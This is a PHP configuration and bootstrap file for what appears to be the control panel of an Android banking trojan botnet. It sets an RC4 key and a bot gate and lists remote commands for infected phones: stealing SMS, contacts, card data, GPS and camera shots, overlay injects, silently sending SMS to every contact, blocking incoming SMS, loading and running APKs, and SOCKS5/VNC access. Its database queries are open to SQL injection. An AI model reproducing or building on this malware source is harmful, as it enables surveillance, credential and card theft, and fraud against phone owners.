<?php
error_reporting(E_ALL ^ E_NOTICE);
	$rc_key = "LBANKS2025!";

	include "configs/mysql.php";

	$kernel['ver'] = "0.4.5";
	$kernel['botver'] = "0.1.6";

	include "libs/rc.php";
	
	include "libs/mysql.php";
	$dbm = new db;
	$dbm->connect();
	//$dbm->query('SET NAMES utf8');

	include "libs/template.php";
	include "libs/date.php";
	include "libs/kernel.php";
	
	include("libs/geoip.inc");

	session_start();

	$rc = new RC4($rc_key);

	$script = basename($_SERVER['PHP_SELF'], ".php");;

	$auth = 0;

	if($script!="login" && $script!="gate" && $script!="cron" && $script!="builder"){
		if($dbm->check_auth($_SESSION['key'])){
			$auth = 1;
		}else{
			header("Location: login.php");
		}
	}
	
	if($script=="builder"){
		if($_GET['op']=="getconfig"){
			
		}else{
			if($dbm->check_auth($_SESSION['key'])){
				$auth = 1;
			}else{
				header("Location: login.php");
			}
		}
	}
	
	if(isset($_SESSION['key'])){
		$res = $dbm->query("select * from users where session='".$_SESSION['key']."';");
		if($dbm->count>0){
			while($row=mysqli_fetch_array($res)) {
				$kernel['userhash'] = md5($row[0]);
				$kernel['userid'] = $row[0];
				$kernel['userparams'] = $row[6];
			}
		}else{
			$kernel['userhash'] = md5(0);
		}
	}

	$kernel['time'] = time();
	$kernel['time_online'] = $kernel['time'] - 300;
	$kernel['time_day'] = $kernel['time'] - 86400;

	if($script!="cron" and $script!="gate"){
		$res = $dbm->query("select * from bots where bot_last_seen>'".$kernel['time_online']."' and bot_user_id='".$kernel['userid']."';");
		$kernel['online'] = mysqli_num_rows($res);
	
		$res = $dbm->query("select * from bots where bot_last_seen>'".$kernel['time_day']."' and bot_user_id='".$kernel['userid']."';");
		$kernel['onlineday'] = mysqli_num_rows($res);

		$res = $dbm->query("select * from bots where bot_user_id='".$kernel['userid']."'");
		$kernel['all'] = mysqli_num_rows($res);
	}

	$kernel['gate'] = "";

	$commands[1] = "GetBrowserHist";
	$commands[2] = "GetContacts";
	$commands[3] = "GetListApps";
	$commands[4] = "GetAllSms";
	$commands[5] = "";
	$commands[6] = "LockPhone";
	$commands[7] = "CallUssd";
	$commands[8] = "LoadApkAndRun";
	$commands[9] = "GetGPS";
	$commands[10] = "CamShot";
	$commands[11] = "SendSms";
	$commands[12] = "";
	$commands[13] = "GetCC";
	$commands[14] = "ReadCallLogs";
	$commands[15] = "SetUrlb";
	$commands[16] = "GetUrlsGate";
	$commands[17] = "SetUrl";
	$commands[18] = "";
	$commands[19] = "SendSMSToAllContact";
	$commands[20] = "SetBlocksNumbers";
	$commands[21] = "ShowInject";
	$commands[22] = "";
	$commands[23] = "MakeSillent";
	$commands[24] = "HideSendSMS";
	$commands[25] = "HideSendSMSToAllContact";
	$commands[26] = "BlockAllInclomingSMS";
	$commands[27] = "UnBlockAllInclomingSMS";
	$commands[28] = "MakeCall";
	$commands[29] = "GetFilesTree";
	$commands[30] = "ChangeStateSocks5";
	$commands[31] = "ChangeStateVNC";
	$commands[32] = "ChangeStatusDebug";
	
	$bot_category[0] = "general";
	$bot_category[1] = "finance";
	$bot_category[2] = "personal";
	$bot_category[3] = "funny";
	
?>
